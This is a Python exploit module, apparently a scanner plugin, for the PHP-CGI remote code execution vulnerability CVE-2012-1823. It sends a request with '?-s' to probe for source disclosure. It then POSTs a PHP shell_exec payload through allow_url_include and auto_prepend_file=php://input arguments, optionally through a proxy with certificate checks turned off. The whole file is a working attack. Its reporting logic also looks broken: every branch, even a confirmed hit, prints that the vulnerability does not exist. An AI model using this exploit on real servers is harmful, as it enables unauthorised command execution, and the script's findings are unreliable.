import requests
import re
from bs4 import BeautifulSoup
import logging
import json

ca4=''
http = ''
https = ''
def dl8(dl):
    global http,https
    http=dl
    https=dl
def tk(ur,s_cookie):
    global ca4
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        url = ur + '?-s'
        logging.captureWarnings(True)
        r = requests.get(url,cookies=s_cookie,proxies=proxies, verify=False)
        r.encoding = 'utf-8'
        caa = BeautifulSoup(r.text, 'html.parser')
        if '<?php' in caa.text:
            logging.captureWarnings(True)
            data="""<?php echo shell_exec("id"); ?>"""
            uy=ur+'?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input'
            r2 = requests.post(uy, data=data,cookies=s_cookie,proxies=proxies, verify=False)
            ca2 = BeautifulSoup(r2.text, 'html.parser')
            ad=re.search('uid=.*? gid=.*? groups=.*',ca2.text)
            if ad!=None:
                ca4='[-]漏洞不存在'
            else:
                ca4 ='[-]漏洞不存在 ?-s 尝试'
        else:
            ca4='[-]漏洞不存在'
    except Exception as aaa:
        ca4='[-]页面访问失败\n'+str(aaa)
def jg6():
    global ca4
    return '--------------------------------------------------\n[ PHP-CGI远程代码执行漏洞（CVE-2012-1823） ]\n\n'+ str (ca4)+'\n'
def u7(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        tk(url1,s_cookie)
    elif pd=='1':
        tk(url1,s_cookie)